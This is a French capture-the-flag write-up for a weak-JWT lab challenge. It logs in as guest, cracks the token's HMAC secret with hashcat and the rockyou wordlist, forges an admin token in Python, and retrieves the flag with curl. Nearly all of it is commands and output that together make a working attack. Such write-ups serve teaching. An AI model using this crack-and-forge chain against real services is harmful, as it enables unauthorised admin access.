@@ -1,0 +1,174 @@
+Table des matieres :
+
+- Récupération du token JWT via la connexion guest/guestpass
+- Analyse du token : décodage base64 pour voir le payload {"is_admin": false}
+- Crack de la signature avec hashcat → clé trouvée : letmein
+- Création d'un token admin avec {"is_admin": true}
+- Accès au dashboard admin avec le nouveau token
+- Récupération du flag : flag{WeakJWT_Admin_Bypass}
+
+Nous arrivons sur une page login nous allons utiliser comme identifiants pour nous connecter gues:guestpass
+
+┌──(szzaps㉿vulnhub)-[~]
+└─$ curl -c cookies.txt -X POST http://15.236.204.114:1236/login \
+  -d "username=guest&password=guestpass" \
+  -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 15.236.204.114:1236...
+* Connected to 15.236.204.114 (15.236.204.114) port 1236
+* using HTTP/1.x
+> POST /login HTTP/1.1
+> Host: 15.236.204.114:1236
+> User-Agent: curl/8.15.0
+> Accept: */*
+> Content-Length: 33
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 33 bytes
+< HTTP/1.1 302 FOUND
+< Server: gunicorn
+< Date: Thu, 23 Oct 2025 14:13:01 GMT
+< Connection: keep-alive
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 199
+< Location: /guest
+* Added cookie token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOmZhbHNlfQ.370cELTDPe4_w3x6FU4kgf2kBhjtTKfkNGfYVrchv4Q" for domain 15.236.204.114, path /, expire 0
+< Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOmZhbHNlfQ.370cELTDPe4_w3x6FU4kgf2kBhjtTKfkNGfYVrchv4Q; HttpOnly; Path=/
+<
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/guest">/guest</a>. If not, click the link.
+* Connection #0 to host 15.236.204.114 left intact
+
+On a donc affaire a un token JWT a manipuler pour elever nos privilèges
+
+┌──(szzaps㉿vulnhub)-[~]
+└─$ voici notre token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOmZhbHNlfQ.370cELTDPe4_w3x6FU4kgf2kBhjtTKfkNGfYVrchv4Q
+
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+echo "eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOmZhbHNlfQ" | base64 -d
+
+{"alg":"HS256","typ":"JWT"}{"username":"guest","is_admin":false}
+┌──(szzaps㉿vulnhub)-[~]
+└─$
+
+Signature = 370cELTDPe4_w3x6FU4kgf2kBhjtTKfkNGfYVrchv4Q
+
+on va donc la cracker :
+
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 2847/5758 MB (1024 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOmZhbHNlfQ.370cELTDPe4_w3x6FU4kgf2kBhjtTKfkNGfYVrchv4Q:letmein
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 16500 (JWT (JSON Web Token))
+Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...rchv4Q
+Time.Started.....: Thu Oct 23 16:15:23 2025 (0 secs)
+Time.Estimated...: Thu Oct 23 16:15:23 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   268.3 kH/s (1.19ms) @ Accel:512 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4096/14344385 (0.03%)
+Rejected.........: 0/4096 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> oooooo
+Hardware.Mon.#1..: Util: 10%
+
+Started: Thu Oct 23 16:15:07 2025
+Stopped: Thu Oct 23 16:15:25 2025
+
+┌──(szzaps㉿vulnhub)-[~]
+└─$
+
+la signature est donc letmein
+
+nous pouvons donc creer un token admin 
+
+import jwt
+
+secret = "letmein"
+payload = {"username": "guest", "is_admin": True}
+admin_token = jwt.encode(payload, secret, algorithm="HS256")
+print(f"Token admin : {admin_token}")
+
+Token admin : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOnRydWV9.QCH9ydxiYDIyDJOtiOY5y-kFxhHfTLAQtDWmyy59tGA
+
+┌──(szzaps㉿vulnhub)-[~]
+└─$ curl -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOnRydWV9.QCH9ydxiYDIyDJOtiOY5y-kFxhHfTLAQtDWmyy59tGA" \
+http://15.236.204.114:1236/admin
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Admin Dashboard — Weak JWT CTF</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header class="nav">
+<a class="brand" href="/">CTF</a>
+<nav>
+<a href="/">Home</a>
+<a href="/login">Login</a>
+<a href="/guest">Guest</a>
+<a href="/admin">Admin</a>
+</nav>
+</header>
+
+
+<main class="container">
+
+<div class="card">
+<h2>Admin Dashboard</h2>
+<p>Welcome, <strong>guest</strong>. You are an admin.</p>
+<p>Flag: <code>flag{WeakJWT_Admin_Bypass}</code></p>
+<p><a class="btn" href="/logout">Logout</a></p>
+</div>
+
+</main>
+
+
+<footer class="foot">
+<small>For CTF / training only.</small>
+</footer>
+</body>
+</html>
+┌──(szzaps㉿vulnhub)-[~]
+└─$
+
+Challenge encore une fois basique mais sympa ! 
